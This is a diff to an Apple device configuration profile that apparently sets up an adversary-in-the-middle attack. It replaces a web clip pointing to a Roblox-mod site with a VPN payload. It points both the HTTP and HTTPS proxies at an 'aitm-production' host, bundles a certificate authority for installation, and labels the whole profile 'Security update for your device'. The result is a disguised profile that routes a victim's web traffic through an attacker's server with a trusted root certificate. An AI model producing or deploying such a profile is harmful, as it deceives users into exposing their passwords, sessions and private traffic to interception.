@@ -6,21 +6,29 @@
     <array>
         <dict>
             <key>PayloadType</key>
-            <string>com.apple.webClip.managed</string>
+            <string>com.apple.vpn.managed</string>
             <key>PayloadVersion</key>
             <integer>1</integer>
             <key>PayloadIdentifier</key>
-            <string>com.security.webclip</string>
+            <string>com.security.vpn.00000000-0000-0000-0000-000000000001</string>
             <key>PayloadUUID</key>
             <string>00000000-0000-0000-0000-000000000001</string>
             <key>PayloadDisplayName</key>
-            <string>Security</string>
-            <key>Label</key>
-            <string>Security</string>
-            <key>URL</key>
-            <string>https://roblox-mod.up.railway.app</string>
-            <key>IsRemovable</key>
-            <false/>
+            <string>VPN</string>
+            <key>UserDefinedName</key>
+            <string>VPN</string>
+            <key>VPNType</key>
+            <string>L2TP</string>
+            <key>RemoteAddress</key>
+            <string>https://aitm-production.up.railway.app</string>
+            <key>AuthenticationMethod</key>
+            <string>SharedSecret</string>
+            <key>SharedSecret</key>
+            <string>secret</string>
+            <key>localIdentifier</key>
+            <string>user</string>
+            <key>remoteIdentifier</key>
+            <string>server</string>
         </dict>
         <dict>
             <key>PayloadType</key>
@@ -32,9 +40,9 @@
             <key>PayloadUUID</key>
             <string>00000000-0000-0000-0000-000000000002</string>
             <key>PayloadDisplayName</key>
-            <string>Security Certificate</string>
+            <string>Certificate</string>
             <key>PayloadCertificateFileName</key>
-            <string>cert.pem</string>
+            <string>ca.crt</string>
             <key>PayloadContent</key>
             <data>
             LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0tCk1JSUREVENDQWZXZ0F3SUJBZ0lVS0xsbUI1VVU1
@@ -71,13 +79,17 @@ VlZXM1RRM1U9Ci0tLS0tRU5EIENFUlRJRklDQVRFLS0tLS0K
             <key>PayloadDisplayName</key>
             <string>Proxy</string>
             <key>HTTPProxy</key>
-            <string>YOUR_PROXY_SERVER</string>
+            <string>https://aitm-production.up.railway.app</string>
             <key>HTTPPort</key>
             <integer>8080</integer>
             <key>HTTPSProxy</key>
             <string>https://aitm-production.up.railway.app</string>
             <key>HTTPSPort</key>
             <integer>8080</integer>
+            <key>ProxyAutoConfigEnable</key>
+            <false/>
+            <key>ProxyCaptiveLoginAllowed</key>
+            <true/>
         </dict>
     </array>
     <key>PayloadDisplayName</key>
@@ -90,5 +102,11 @@ VlZXM1RRM1U9Ci0tLS0tRU5EIENFUlRJRklDQVRFLS0tLS0K
     <string>00000000-0000-0000-0000-000000000004</string>
     <key>PayloadVersion</key>
     <integer>1</integer>
+    <key>PayloadDescription</key>
+    <string>Security update for your device</string>
+    <key>PayloadOrganization</key>
+    <string>Security</string>
+    <key>PayloadRemovalDisallowed</key>
+    <false/>
 </dict>
 </plist>
